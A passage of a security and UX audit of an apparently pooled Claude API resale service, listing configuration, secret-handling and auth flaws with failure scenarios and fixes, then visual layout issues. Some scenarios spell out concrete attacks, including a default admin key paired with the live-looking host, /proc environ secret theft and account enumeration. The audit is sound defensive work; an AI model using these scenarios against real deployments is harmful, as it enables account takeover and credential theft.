`crates/server/src/panel.html:76` — _control-key-exposure_  
The panel stores the entered key in `localStorage`, sends it from browser JavaScript as `x-api-key`, and explicitly advertises that a Control key unlocks the full money view. This directly violates the invariant that the Control key exists only in server-side environment and must never reach a browser.  
- **Failure:** An operator follows the panel text, enters `CLAUDE_API_CONTROL_KEY` to see balances/recommendations, and leaves it persisted as `capkey`. Any script executing on that origin, a malicious browser extension, or another user of the same browser profile can read the raw key and obtain engine money/control privileges wherever `/admin/*` is reachable.  
- **Fix:** Make the browser panel accept only a separately scoped panel credential and ensure that credential cannot authorize Control endpoints. Never support a raw Control/admin key in client-side code. Serve privileged views through a server-side authenticated session or a short-lived, narrowly scoped proxy token, and store no long-lived secret in localStorage.  

**C33. [HIGH · CONFIRMED] An unvalidated negative default multiplier creates free, unmetered customer accounts**  
`crates/server/src/config.rs:80` — _billing-configuration_  
`CLAUDE_API_MULT_BP` is parsed as any `i64` without the 0..10000 validation applied to the pricing-update endpoint. The value is used unchanged when Control API account creation omits `mult_bp`. The forwarding path explicitly treats any multiplier <= 0 as a free key with a zero hold, and settlement clamps negative actual charges to zero.  
- **Failure:** Production is started with `CLAUDE_API_MULT_BP=-1` due to a typo or bad deployment template. Every subsequently provisioned account that relies on the default receives `mult_bp=-1`; it can send requests with positive balance while `cap_to_balance` reserves zero and all actual charges settle as zero, allowing unlimited free usage until corrected account by account.  
- **Fix:** Parse this setting in `Settings` with a strict 0..=10000 range, reject invalid production configuration at startup, and apply the same validation inside account creation before persistence. If zero is intentionally supported for a controlled free tier, require an explicit separate opt-in rather than accepting any negative value.  

**C34. [HIGH · CONFIRMED] The production server template contains publicly known admin keys that pass startup checks**  
`server.env.example:4` — _default-credential_  
The file instructs operators to copy it to the production secrets path but supplies two fixed `CLAUDE_API_KEYS`. These strings are 26 and 29 characters long, so the only runtime check—warning for keys shorter than 24—does not even warn. A matching `CLAUDE_API_KEYS` value is classified as `Authz::Admin`, bypassing customer billing on the publicly proxied `/v1/*` API.  
- **Failure:** An operator copies the template to `/srv/claude-api/data/server.env`, fixes permissions, and starts the service without replacing both values. Anyone reading the public repository can call `https://api.apitoken.sale/v1/messages` with `x-api-key: put-a-long-random-key-here` and consume subscription-pool capacity without a balance.  
- **Fix:** Do not provide syntactically valid credential values in a production-copy template. Leave the variable empty with a generation command, reject known sentinel/example strings, and fail startup when a public bind has no strong generated key. Validate sufficient entropy/format, not only minimum length.  

**C35. [HIGH · CONFIRMED] CLAUDE_API_UPSTREAM can redirect every fleet OAuth token to an arbitrary or plaintext host**  
`crates/server/src/config.rs:102` — _secret-destination-validation_  
The upstream setting is accepted as an arbitrary non-empty string. The forwarder concatenates the client path to it and attaches each selected subscription's OAuth bearer token. There is no scheme, hostname, or production-mode guard, even though the HTTP override exists primarily for local mock smoke tests.  
- **Failure:** A deployment sets `CLAUDE_API_UPSTREAM=http://198.51.100.7` instead of the Anthropic endpoint. The next client request is sent over plaintext to that host with `Authorization: Bearer <subscription token>`, disclosing one fleet credential per routed subscription to the remote server or a network observer.  
- **Fix:** Parse the upstream as a URL and, in normal service mode, require `https://api.anthropic.com` (or an explicit allowlist). Permit insecure HTTP only for loopback test endpoints behind an explicit test-only flag. Reject userinfo, fragments, unexpected paths, and non-HTTPS remote hosts at startup.  

**C36. [HIGH · CONFIRMED] Production SMTP permits a silent plaintext downgrade for credentials and reset tokens**  
`apps/worker/src/config.ts:19` — _transport-security_  
Production validation accepts `SMTP_SECURE=false`, including when username/password authentication is configured. The Nodemailer transport passes only `secure`; it does not set `requireTLS`. With `secure=false`, Nodemailer uses STARTTLS only when the server advertises it and otherwise continues over plaintext, sending SMTP credentials and email bodies that contain raw verification/password-reset tokens.  
- **Failure:** The worker runs in production with port 587, `SMTP_SECURE=false`, and SMTP credentials. A misconfigured server or active network attacker omits/strips STARTTLS. The worker continues, authenticates in plaintext, and sends a reset email whose URL contains the raw token, allowing SMTP credential theft and account takeover.  
- **Fix:** In production require either implicit TLS (`secure=true`) or STARTTLS with `requireTLS=true`; reject plaintext configurations. Prefer explicit transport modes such as `smtps` and `starttls-required`, verify certificates, and add a startup connection/TLS check.  

**C84. [MEDIUM · CONFIRMED] Commerce can send the engine Control key to any configured HTTP URL**  
`apps/api/src/config.ts:8` — _control-key-exfiltration_  
Both API and worker validate `ENGINE_BASE_URL` only as a generic URL. Non-loopback HTTP and attacker-controlled HTTPS origins are accepted in production. `EngineClient` adds `ENGINE_CONTROL_KEY` as `x-api-key` to every authenticated Control request, so a destination typo or unsafe remote deployment leaks the highest-privilege engine credential.  
- **Failure:** Production is configured with `ENGINE_BASE_URL=http://10.0.0.25:8787` across a shared network, or with the wrong HTTPS hostname. On the next account provisioning, credit, key, or ledger request, the Control key is transmitted in cleartext or directly to the unintended host.  
- **Fix:** Use a shared URL validator in API and worker: allow HTTP only for loopback/Unix-local development, require HTTPS for every non-loopback host, and optionally pin production to the documented engine origin. Reject embedded credentials and unexpected base paths.  

**C85. [MEDIUM · CONFIRMED] PUBLIC_APP_BASE_URL can route raw verification and reset tokens to an insecure or attacker host**  
`apps/worker/src/config.ts:15` — _auth-token-exfiltration_  
`PUBLIC_APP_BASE_URL` is only checked as a generic URL, with no production HTTPS or canonical-host requirement. The email worker appends the decrypted one-time auth token as a query parameter to this base and sends the resulting URL to users. The same variable also controls browser CORS and auth redirects in the API.  
- **Failure:** Production is started with `PUBLIC_APP_BASE_URL=http://apitoken.sale` or `https://apitoken-sale.example` after a deployment typo. Every verification/reset email directs the user and its raw token over plaintext or to the wrong operator; whoever observes or owns that destination can verify the account or reset its password.  
- **Fix:** Conditionally enforce exactly the canonical HTTPS frontend origin in production. If preview environments are required, use an explicit allowlist per environment and never accept HTTP except loopback development. Consider moving tokens to URL fragments or a short-lived exchange code to reduce server/referrer logging exposure.  

**C86. [MEDIUM · CONFIRMED] Subscription CLI output prints credentialed proxy URLs in clear text**  
`crates/server/src/main.rs:353` — _proxy-secret-exposure_  
The registry rules classify proxies as secrets, but both `sub add` and routine `sub list` print the stored proxy string verbatim. Credentialed proxy URLs commonly contain `username:password@host`, so normal administration exposes reusable credentials to terminal scrollback, captured command output, automation logs, and support transcripts.  
- **Failure:** A subscription is configured with `http://customer:proxy-password@proxy.example:8000`. Running `claude-api sub list` during diagnosis prints that entire URI; a journal/CI collector or person receiving the pasted output obtains the proxy credentials.  
- **Fix:** Centralize proxy redaction and print only scheme plus masked host/port, never userinfo. Ensure error formatting and all CLI/list/admin views use the same redactor.  

**C87. [MEDIUM · CONFIRMED] The CLI accepts raw tokens, keys, and proxy passwords as command-line arguments**  
`crates/server/src/main.rs:114` — _cli-secret-exposure_  
Secret-bearing operations accept a subscription token via `--token`, proxy URLs as arguments, and full customer API keys as positional arguments for enable/disable/remove. Shell history, auditd, process accounting, and `/proc/<pid>/cmdline` can retain or expose these values. `add-file` exists for subscription tokens, but the unsafe inline path remains first-class and key operations have no non-argv alternative.  
- **Failure:** An operator runs `claude-api sub add user@example --token sk-ant-... --proxy http://u:p@host`. Another local user reads the process command line while it executes, or the token and proxy password remain in `.bash_history` and centralized terminal/session recording.  
- **Fix:** Remove or deprecate inline secret arguments. Read tokens/keys from stdin, a file descriptor, a mode-0600 file, or an interactive no-echo prompt. For key revocation prefer the existing non-secret `key_id` path.  

**C88. [MEDIUM · CONFIRMED] Gitignore does not cover standard dotenv variants**  
`.gitignore:15` — _repository-secret-hygiene_  
The pattern `*.env` ignores `.env` and names ending in `.env`, but it does not ignore conventional secret files such as `.env.local`, `.env.production`, `.env.development`, or `.env.test.local`. `git check-ignore` confirms these paths are currently unignored, making accidental credential commits likely in the TypeScript/Next.js workspace.  
- **Failure:** A developer creates `apps/api/.env.production` containing the production database URL, Control key, OAuth secrets, and token-encryption key. `git status` lists it as an ordinary untracked file and it can be committed by `git add .`, despite the repository comment claiming environment secrets are never tracked.  
- **Fix:** Ignore `.env`, `.env.*`, and equivalent nested forms globally, then explicitly unignore only reviewed examples such as `!**/.env.example`. Add secret scanning/pre-commit and CI checks as a second layer.  

**C89. [MEDIUM · CONFIRMED] Rust service reads operational env outside config.rs and accepts dangerous unbounded values**  
`crates/server/src/main.rs:409` — _configuration-boundary_  
`CLAUDE_API_DB_READERS`, `CLAUDE_API_MAX_CONCURRENT`, `CLAUDE_API_LEDGER_DAYS`, and `CLAUDE_API_METRICS_DAYS` are read directly in `main.rs`, violating the explicit invariant that all env access occurs only in `crates/server/src/config.rs`. They are parsed without range validation and invalid values silently fall back.  
- **Failure:** A deployment sets `CLAUDE_API_MAX_CONCURRENT=0`; the server starts normally but every `/v1` request immediately receives 503 because the semaphore has zero permits. Setting an extremely large `CLAUDE_API_DB_READERS` attempts to create that many channels, SQLite connections, and OS threads, potentially exhausting memory/file descriptors during startup. These values bypass any centralized validation or startup diagnostics.  
- **Fix:** Move all four fields into `Settings`, validate explicit safe ranges at startup, and reject malformed values rather than silently defaulting. Add tests that enumerate every supported env variable and assert that no `env::var` exists outside `config.rs`.  

**C90. [MEDIUM · CONFIRMED] API and worker run under the same Unix identity, allowing cross-service environment-secret reads**  
`systemd/apitoken-api.service:9` — _service-isolation_  
Both the public-facing API and background worker run as `User=deploy`/`Group=deploy`, and neither unit isolates `/proc`. On the documented/default Linux setup, same-UID processes can inspect each other's `/proc/<pid>/environ`. This defeats the intended independent-service secret boundary: an API compromise can read worker-only SMTP credentials, while a worker compromise can read API-only commercial admin, payment-provider, and OAuth secrets.  
- **Failure:** An RCE in the Internet-facing NestJS API executes as `deploy`, locates the worker PID, and reads `/proc/<worker-pid>/environ`, recovering `SMTP_PASSWORD`. Conversely, code execution in the worker can read `/proc/<api-pid>/environ` and steal `COMMERCIAL_ADMIN_KEY`, Google/GitHub client secrets, and provider API keys.  
- **Fix:** Create distinct least-privilege Unix users for API and worker, give each only its own environment/credential files, and retain only the deliberately shared secrets. Add appropriate systemd proc isolation and preferably use systemd credentials (`LoadCredential=`) or a secrets manager rather than broad process environment variables.  

**C91. [MEDIUM · CONFIRMED] The commercial admin example key is a known placeholder that passes validation**  
`apps/api/.env.example:16` — _default-credential_  
Unlike the deliberately invalid Control/encryption placeholders, `COMMERCIAL_ADMIN_KEY=replace-with-at-least-32-random-characters` is 42 characters and therefore passes `z.string().min(32)`. The copied environment can start with a repository-known admin credential, and Caddy exposes the guarded `/v1/admin/*` routes through the public backend host.  
- **Failure:** An operator starts from the documented copied `.env.example`, updates the required Control and encryption keys, but overlooks `COMMERCIAL_ADMIN_KEY` because validation succeeds. An external attacker uses the repository-known value in `x-admin-key` to create B2B invitations or alter business-user pricing.  
- **Fix:** Use an empty/commented placeholder that cannot pass validation, explicitly reject known sentinel strings, and require a generated high-entropy value whenever commercial admin routes are enabled in production. Consider network-restricting operator routes in addition to header authentication.  


### Backend · Auth  

**C61. [MEDIUM · CONFIRMED] Engine-account provisioning can override an administrative `disabled` state**  
`apps/api/src/auth.service.ts:266` — _authorization-state-bypass_  
The authentication-time provisioning path treats every state except `active` as eligible for provisioning, including the explicitly terminal `disabled` state. The database transitions compound this: `completeEngineAccount` can change a disabled row to `active` whenever `engine_account_id` is NULL, while `failEngineAccount` unconditionally changes any state, including `disabled`, to `error`. This contradicts `/Users/3xcalibur/Desktop/IT/Vibecode/Claude_API/apps/api/src/account.service.ts:31`, which treats `disabled` as an authorization decision that must block provisioning and account access.  
- **Failure:** An operator disables an unprovisioned abusive user's engine mapping by setting `engine_accounts.status = 'disabled'` while its `engine_account_id` is still NULL, but leaves the commerce user active so they can access non-engine account functions. The user then completes email verification or a valid OAuth login. `provisionEngineAccount` does not stop on `disabled`, creates and funds a new engine account, and `completeEngineAccount` matches the row through `OR engine_account_id IS NULL`, changing it back to `active`. The response issues a session, after which the user can issue an API key and consume engine credit despite the administrative disable. Even when creation fails, `failEngineAccount` erases the disabled state by changing it to `error`, making later automatic reprovisioning eligible.  
- **Fix:** Make `disabled` terminal in every provisioning caller: return an authorization error before any engine request when the mapping is disabled. Replace the database updates with compare-and-set transitions that permit only `pending`/`error` (preferably from a claimed provisioning lease/version) and never update `disabled` or an already-active row. Have `completeEngineAccount` return whether it actually won the transition, and compensate any remote account created after losing it.  

**C99. [LOW · CONFIRMED] Registration responses provide a reliable account-enumeration oracle**  
`apps/api/src/auth.controller.ts:67` — _account-enumeration_  
The public registration endpoint maps a unique-email collision to a distinct HTTP 409 response and explicit message, while a previously unseen email returns a successful registration response. This reveals whether an arbitrary address has an account; the forgot-password and verification-resend endpoints otherwise use uniform accepted responses, so registration defeats that anti-enumeration behavior.  
- **Failure:** An attacker submits `POST /v1/auth/register` for each address in a target-company email list using any schema-valid 8-character password. `victim@company.test` returns 409 with `email is already registered`, while an unregistered address returns the normal user/verification-required payload. One request per address is sufficient to build a confirmed customer list for targeted credential stuffing or phishing.
- **Fix:** Return the same status and generic outward response for existing and newly submitted addresses, and deliver any account-specific guidance only through email. If product requirements require an interactive conflict, explicitly accept the privacy tradeoff and add stronger abuse controls, but do not present the endpoint as enumeration-resistant.  


### Frontend · Auth flows  

**C78. [MEDIUM · CONFIRMED] Password-reset bearer token remains in the URL and browser history**  
`apps/web/src/app/reset-password/reset-password-form.tsx:10` — _credential_exposure_  
The page reads the password-reset bearer token from the query string and leaves the credential in the address bar for the entire form interaction. The URL is replaced only after a successful reset, so an abandoned page, validation failure, network failure, or backend error leaves a still-valid account-takeover credential in browser history. The global analytics hook strips queries from Vercel events, but that does not remove the token from browser history or prevent the initial token-bearing page URL from reaching the frontend infrastructure.  
- **Failure:** A user opens `/reset-password?token=<valid-token>`, then closes the page after a transient API failure or before submitting. On a shared or synchronized browser profile, another person reopens that history entry before the one-hour token expiry, submits a new password, and takes over the account.  
- **Fix:** Do not put reset credentials in the query string. Generate email links with the token in a URL fragment, read it once client-side, immediately remove the fragment with `history.replaceState`, and retain the token only in component memory. If query links must remain temporarily compatible, capture and scrub the query immediately on load and add a sensitive-route `Referrer-Policy: no-referrer`; note that client-side scrubbing alone cannot prevent the initial query URL from reaching the frontend server/CDN.  

**C79. [MEDIUM · CONFIRMED] Email-verification token remains exposed until verification completes**  
`apps/web/src/app/verify-email/verify-email.tsx:12` — _credential_exposure_  
The verification page also consumes a bearer token directly from the query string without immediately removing it. The backend exchanges this token for a logged-in session, so it is effectively an authentication credential, not merely a harmless status parameter. The URL is replaced only after successful verification; offline loads, early tab closure, and request failures preserve a still-valid token in browser history.  
- **Failure:** A newly registered user opens `/verify-email?token=<valid-token>` on a shared browser, but closes the tab before the POST reaches the API. Another user reopens the history entry within the verification TTL. The page automatically calls `api.verifyEmail(token)`; the backend verifies the email, issues its HttpOnly session cookie, and the attacker is redirected into the new account's dashboard.  
- **Fix:** Deliver verification tokens in the URL fragment, capture them once, and immediately scrub the fragment before starting the API request. For backward-compatible query links, synchronously copy the token into memory and call `history.replaceState` before verification, while also setting `Referrer-Policy: no-referrer` on the sensitive route. Ultimately stop generating query-string token links so the credential never reaches frontend request logs.  

**C106. [LOW · CONFIRMED] Registration UI exposes whether an email is already registered**  
`apps/web/src/app/register/register-form.tsx:30` — _account_enumeration_  
The registration form renders the backend's authentication error message verbatim. The traced registration endpoint returns the specific message `email is already registered` for an existing address, while an unused address follows the success path. This provides a deterministic account-membership oracle.  
- **Failure:** An attacker submits `target@example.com` with any schema-valid password. If the address exists, the form displays `email is already registered`; if it does not, registration succeeds and the browser redirects to verification. The attacker can therefore determine whether named people or company addresses use the service.  
- **Fix:** Fix this at the API boundary, not only in the React component: return the same accepted/generic response for existing and newly submitted addresses, and send an appropriate email to the address when action is needed. As defense in depth, authentication forms should map known statuses to approved generic copy rather than rendering arbitrary backend messages verbatim.  

---

## 7. Visual / UX findings (rendered screenshots)

51 screenshots across all pages × light/dark × desktop/tablet/mobile × EN/RU. `Vn` numbers are
sequential. The two high-severity items are the docs mobile overflow and a usage/key figure that looks
inconsistent (the latter traces to the audit *fixture* data in `capture-site.mjs`, which is not
internally reconciled — confirm against a real account before treating as a product bug).

### docs  

**V1. [HIGH] docs / entire mobile content column, especially hero, code examples, and pricing** — The main documentation column is wider than the 390px viewport and is clipped along the right edge.  
This is visible from the hero onward: “Build with one Claude…” is cut off, section headings such as “Pricing & discount tiers” lose their endings, prose disappears mid-line, cards have no visible right edge, and long URLs/code lines in Quick start, Developer tools, and SDKs run beyond the capture. Important instructions and code cannot be read without horizontal page scrolling, and no usable horizontal-scroll affordance is visible.  
- **Fix:** Remove fixed/min-content widths from the mobile content path and apply `min-width: 0; width: 100%; max-width: 100%` to the main flex/grid child and cards. Allow prose and headings to wrap. Keep only code/pre regions horizontally scrollable with `max-width: 100%; overflow-x: auto`, while preventing the document itself from overflowing the viewport.  
- _shots: docs-mobile.png,  docs-mobile-dark.png_  

**V2. [MEDIUM] docs / mobile header and page navigation** — The desktop table-of-contents sidebar disappears on mobile without any replacement navigation.  
The desktop captures provide direct links for Overview, Quick start, Authentication, Developer tools, SDKs, Errors, and Pricing & tiers. In both mobile captures, the header contains only branding, language/theme controls, and Dashboard; there is no menu, section index, or jump control for this very long 7,793px page. The Dashboard button also wraps onto a separate row, leaving the lower-left half of the header empty and making the navigation feel unfinished.  
- **Fix:** Add a compact “On this page” drawer, menu, or sticky section selector on mobile. Consolidate the language, theme, and Dashboard actions into a balanced single-row or intentional two-row header rather than letting Dashboard wrap by itself.  
- _shots: docs-mobile.png,  docs-mobile-dark.png_  

**V3. [MEDIUM] docs / Pricing & discount tiers / mobile tier list** — The mobile pricing-table reflow removes all column labels, leaving the stacked values ambiguous.  
Desktop clearly labels Discount, $1 buys, Top up to reach, and Keep / 30 days. On mobile, each tier shows only values such as “65%”, “×2.86”, “$100”, and “$50 / 30d” in a vertical stack with no labels, so readers must remember the desktop column order to understand what each number means.  
- **Fix:** Render each mobile tier as explicit label/value rows, for example “Discount — 65%”, “$1 buys — ×2.86”, “Top up to reach — $100”, and “Keep / 30 days — $50 / 30d”, or retain a horizontally scrollable labeled table.  
- _shots: docs-mobile.png,  docs-mobile-dark.png_  


### dashboard-usage  

**V4. [HIGH] dashboard usage / Usage by API key** — The single-key summary contradicts its only detail row  
The summary states 1 key, $30 official value, and $12 charged, but the sole API-key row shows $23.37 official value and $9.35 charged. Because there is exactly one key, the totals should reconcile; the visible mismatch makes the billing breakdown look unreliable.  
- **Fix:** Calculate the summary and detail row from the same filtered dataset and rounding policy. Add an explicit period label if the rows intentionally cover a different date range.  
- _shots: dashboard-usage-light.png,  dashboard-usage-dark.png_  

**V5. [MEDIUM] dashboard usage / Usage over time and Tokens & models** — Color-coded usage graphics have no visible legend  
The stacked chart and the long blue/purple/teal composition bar rely only on color, but neither graphic labels what each color represents. The model dots appear later in the table, forcing users to infer the mapping, and the similar blue and purple are especially difficult to distinguish without a nearby key.  
- **Fix:** Add an inline legend naming Opus, Sonnet, and Haiku beside each visualization, using both color and a non-color cue such as labels or patterns. Keep the legend order consistent with the table.  
- _shots: dashboard-usage-light.png,  dashboard-usage-dark.png_  


### home  

**V6. [MEDIUM] home / final “Ready to start building?” CTA** — The secondary “Read documentation” button overflows and is clipped by the right viewport edge.  
At the 390 px mobile width, the two CTAs remain in a single row. Their combined widths exceed the available content area, so the documentation button loses its right border/corners and creates a visibly broken edge instead of preserving the page’s side padding.  
- **Fix:** Stack the CTA buttons at this breakpoint, or make both flex children shrink within the container (for example, `min-width: 0; flex: 1`) while preserving equal left and right page padding.  
- _shots: home-mobile.png_  


### integrations  

**V7. [MEDIUM] Claude Code guide / Configuration code block** — The command block has no visible copy affordance.  
The guide’s primary actionable content is a large code block, but the entire upper-right area is empty and there is no copy button or copied-state feedback. This makes a key setup interaction look incomplete and forces manual selection of multi-line commands.  
- **Fix:** Add a clearly visible “Copy” icon/button in the code block’s top-right corner with focus, hover, and temporary “Copied” feedback.  
- _shots: integration-guide-desktop.png_  

**V8. [LOW] header / primary navigation** — The current Integrations section has no active navigation state.  
“Integrations” is rendered with the same gray color and weight as every other navigation item, even on the integrations index and guide. This removes a useful location cue and makes the header feel unfinished.  
- **Fix:** Give the active item a persistent brand-blue treatment, underline, bottom rule, or higher-contrast weight on both pages.  
- _shots: integrations-desktop.png,  integration-guide-desktop.png_  

**V9. [LOW] integrations index / integration cards** — The catalog cards lack recognizable integration identities and read like a generic numbered template.  
Every card uses only an abstract 01–06 number despite representing well-known, visually distinct products. The repeated card structure is polished mechanically, but the absence of product marks makes the grid slower to scan and visually underdeveloped for an integrations catalog.  
- **Fix:** Add a consistently sized monochrome or brand-controlled icon for Claude Code, Cursor, Cline, Continue, Zed, and the SDK; retain the numbers only as secondary metadata if they are part of the visual system.  
- _shots: integrations-desktop.png_  

**V10. [LOW] Claude Code guide / lower page between CTAs and footer** — A large empty vertical gap makes the guide look underfilled.  
After the two CTA buttons, there is an unusually broad blank area before the footer divider. Because the guide contains only one short configuration block, the page reads as if additional guide content failed to render or has not yet been designed.  
- **Fix:** Add the missing practical setup material—verification, troubleshooting, platform-specific notes—or reduce the forced minimum-height/footer spacing so the footer follows the content more naturally.  
- _shots: integration-guide-desktop.png_  

**V11. [LOW] header / language and theme controls** — Utility controls are visually undersized beside the authentication buttons.  
The EN/RU selector and moon button are much shorter and more delicate than the adjacent Log in and Sign up controls; the moon glyph is especially faint. The mixed control heights make the right side of the header feel uneven, and the theme action is easy to miss.  
- **Fix:** Normalize the utility controls to a more substantial shared height and improve the moon icon’s size/stroke contrast while preserving a secondary hierarchy relative to authentication.  
- _shots: integrations-desktop.png,  integration-guide-desktop.png_  


### dashboard-credits  

**V12. [MEDIUM] dashboard credits / tier progress track** — The progress line visually shows the account almost at Builder despite only $12 of the required $100 being topped up.  
The blue segment runs roughly 80–90% of the distance from Starter to Builder in both the horizontal and vertical versions. That conflicts with the adjacent status items, which say “$12 cumulative” and “Top up $88 more,” and makes the progress visualization materially misleading.  
- **Fix:** Calculate the active segment from cumulative progress toward the next threshold; for $12 of $100, show about 12% of the Starter-to-Builder interval. Keep the same calculation when the track switches to vertical on mobile.  
- _shots: dashboard-topup-light.png, dashboard-topup-dark.png, dashboard-topup-tablet-light.png, dashboard-topup-mobile-light.png, dashboard-topup-mobile-dark.png, dashboard-topup-mobile-russian.png_  

**V13. [MEDIUM] dashboard credits / mobile tier ladder** — Tier details are squeezed into a narrow strip and rendered as near-microtext while a large portion of the card remains unused.  
Each vertical step occupies only the left side of the card, leaving substantial empty space to the right. Requirements and retention copy are extremely small and faint; this is especially difficult to read in dark mode and the longer Russian labels are forced into an unnecessarily cramped column.  
- **Fix:** Let each tier’s text block use the remaining card width, raise helper text to at least 11–12px with stronger secondary contrast, and allow the Russian requirements to wrap naturally rather than shrinking the typography.  
- _shots: dashboard-topup-mobile-light.png, dashboard-topup-mobile-dark.png, dashboard-topup-mobile-russian.png_  

**V14. [LOW] dashboard credits / mobile top-up history** — The discount badge stretches across almost the entire value column and looks like an empty input field.  
Other history values are compact text, but the “−60%” pill expands to a long rounded bar. The inconsistent width gives the row excessive visual weight and makes the badge read as a disabled control rather than a status value; the effect is particularly pronounced in dark mode.  
- **Fix:** Make the discount badge content-sized with compact horizontal padding, aligned to the same value start as the other history fields.  
- _shots: dashboard-topup-mobile-light.png, dashboard-topup-mobile-dark.png, dashboard-topup-mobile-russian.png_  

**V15. [LOW] dashboard credits / converter introduction and preset buttons** — The copy says “No preset amounts” immediately above four preset amount buttons.  
Even if the buttons are intended as optional shortcuts rather than fixed packages, the visible wording directly contradicts the UI beneath it and makes the reworked converter feel unfinished.  
- **Fix:** Use unambiguous copy such as “No fixed packages and no decimals. Enter any whole-dollar amount, or use a shortcut below.”  
- _shots: dashboard-topup-light.png, dashboard-topup-dark.png, dashboard-topup-tablet-light.png, dashboard-topup-mobile-light.png, dashboard-topup-mobile-dark.png_  


### dashboard-misc  

**V16. [MEDIUM] dark theme / disabled primary actions** — Disabled button labels have extremely weak contrast  
The labels on “Activate,” “Connect Telegram,” “Save,” and “Enable 2FA” are rendered as muted gray on dark blue. They are substantially harder to read than surrounding secondary text and look accidentally faded rather than deliberately disabled.  
- **Fix:** Use a disabled-state color pair with clearer text-to-background contrast, or use a neutral outlined/gray disabled treatment. Keep the disabled state recognizable without making the label nearly disappear.  
- _shots: dashboard-promos-dark.png,  dashboard-profile-dark.png,  dashboard-security-dark.png_  

**V17. [MEDIUM] promo codes / redemption panel** — The future promo feature reads like an unfinished implementation rather than an intentional placeholder  
A complete input-and-button form is shown but unusable, while two separate messages say the feature is not implemented (“will activate after its server-side domain is implemented” and “is not active yet”). The internal implementation wording and duplicated explanation make the panel feel broken or staged.  
- **Fix:** Replace the dead form with one polished coming-soon state and user-facing copy, or hide the redemption controls until functional. Avoid references to the “server-side domain” and remove the duplicate status message.  
- _shots: dashboard-promos-light.png,  dashboard-promos-dark.png_  

**V18. [MEDIUM] profile / Telegram card** — The main Telegram action appears broken because it is disabled without explanation  
The card says “NOT CONNECTED” and instructs the user to connect Telegram, but the “Connect Telegram” button is visibly disabled and no coming-soon or availability message explains why. The primary instruction therefore leads directly to an action that cannot be taken.  
- **Fix:** If the integration is future functionality, replace the disabled CTA with a clear “Coming soon” state or explanatory helper text. If it should be available, render the CTA as a normal enabled primary action.  
- _shots: dashboard-profile-light.png,  dashboard-profile-dark.png_  

**V19. [LOW] security / two-factor authentication panel** — Internal backend-status copy makes the security area look unfinished  
The disabled “Enable 2FA” button is paired with the developer-facing phrase “Backend support required.” Although this explains the disabled state, it exposes implementation status and gives a production account page a placeholder-quality appearance.  
- **Fix:** Use a deliberate user-facing availability treatment such as “Two-factor authentication is coming soon,” without rendering a dead CTA, or hide the panel until the feature is available.  
- _shots: dashboard-security-light.png,  dashboard-security-dark.png_  

**V20. [LOW] profile / desktop card grid** — The Security card is visually orphaned beneath the right column  
The large Profile card occupies the left column while a short Security card sits below Telegram on the right, leaving a conspicuous empty block under the Profile card. The resulting bottom edge is heavily unbalanced and makes the page composition look incomplete.  
- **Fix:** Place the Security card beneath the Profile card, span it across both columns, or use a balanced row/grid structure so the lower section does not leave an accidental-looking void.  
- _shots: dashboard-profile-light.png,  dashboard-profile-dark.png_  


### plans  

**V21. [LOW] plans / links and blue micro-labels throughout dark theme** — Blue interactive text is too dim against the near-black surfaces  
Small blue elements such as “Payment and refund terms,” the active “Prices & tariffs” chip, tier multipliers, and “Read the full pricing guide” have visibly weaker contrast than the surrounding white/gray text. At their small monospace size they recede and are harder to read, particularly inside the pricing table.  
- **Fix:** Use a lighter dark-theme accent blue for text and links, while retaining the current stronger blue for fills and borders; verify contrast at the actual 11–13px text sizes.  
- _shots: plans-dark.png_  

**V22. [LOW] plans / mobile header** — The hamburger control is undersized and visually inconsistent with adjacent controls  
The menu appears as a tiny unboxed glyph at the far right, while the language and theme controls have clear bordered button shapes. It is easy to overlook and makes the header controls look unfinished or misaligned.  
- **Fix:** Place the menu icon in a button matching the theme control’s dimensions, border, and alignment, and use a larger icon with a clear touch target.  
- _shots: plans-mobile.png_  

**V23. [LOW] plans / mobile footer navigation** — The final “Pricing” footer link wraps onto an isolated second line  
“Privacy Policy,” “User Agreement,” and “Support” occupy the first row while “Pricing” sits alone beneath them, producing an accidental-looking ragged footer layout.  
- **Fix:** Switch the mobile footer links to an intentional two-column grid or vertical list, or reduce spacing/type slightly so the navigation wraps evenly.  
- _shots: plans-mobile.png_  


### models  

**V24. [LOW] models / official list rates callout** — Both columns end with awkward orphaned text  
The left headline wraps with “calculation” alone on its second line, while the explanatory copy leaves “negotiated.” alone on a third line. The paired orphans make the callout look under-tuned despite having ample horizontal space.  
- **Fix:** Relax the text max-widths or rebalance the two-column proportions so the headline fits on one line and the body copy resolves into two balanced lines.  
- _shots: models-dark.png_  

**V25. [LOW] models / pricing table** — Table structure loses definition in dark theme  
The table header fill and row separators are extremely close to the page background, so the header, rows, and table boundary visually merge into the surrounding grid. The light capture has noticeably clearer grouping.  
- **Fix:** Raise the dark header surface and divider contrast slightly, or add a subtle outer border/background to the table body while preserving the restrained aesthetic.  
- _shots: models-dark.png_  

**V26. [LOW] models / Claude Opus 4.8 row** — The LATEST status badge is too small and faint  
The badge uses very small uppercase text with a thin, low-contrast outline; at the captured desktop scale it is substantially harder to read than every other table label, especially in dark mode.  
- **Fix:** Increase the badge text and horizontal padding slightly and strengthen its border/text contrast in both themes.  
- _shots: models-dark.png_  


### compliance  

**V27. [LOW] support / mobile footer** — Footer navigation wraps into an unbalanced 3+1 layout.  
At 390 px, “Privacy Policy,” “User Agreement,” and “Support” share the first row while “Pricing” is stranded by itself at the left of a second row. The orphaned link makes the footer look accidentally wrapped rather than intentionally composed.  
- **Fix:** Use a deliberate two-column/two-row grid for the four links on narrow screens, or assign consistent item widths so wrapping produces a balanced 2+2 layout.  
- _shots: support-mobile.png_  


### dashboard-overview  

**V28. [LOW] dashboard overview / tier progress milestone chart** — Milestone supporting text is undersized and faint  
The top-up and retention conditions beneath all five tier milestones render at roughly footnote scale and with weak muted contrast. They are visibly difficult to read in light mode, become fainter in dark mode, and are especially dense in Russian.  
- **Fix:** Increase this copy to at least 11–12px with a slightly stronger muted-text color and a little more line height; shorten localized strings where necessary rather than shrinking them.  
- _shots: dashboard-overview-light.png,  dashboard-overview-dark.png,  dashboard-overview-russian.png_  

**V29. [LOW] dashboard overview / tier progress summary strip / next tier** — Russian next-tier metadata wraps into an awkward orphan line  
In the middle summary cell, “Откроется Разработчик · скидка 65%” is squeezed beside the blue amount and leaves “65%” isolated on a second line. The uneven wrap makes this cell look noticeably more cramped than the English version and the neighboring cells.  
- **Fix:** Place the explanatory metadata on its own line below the blue amount, or allow the middle cell’s content to stack when the localized string exceeds the available inline width.  
- _shots: dashboard-overview-russian.png_  

**V30. [LOW] dashboard overview / tier progress summary rows** — Helper copy remains in a narrow side column after mobile stacking  
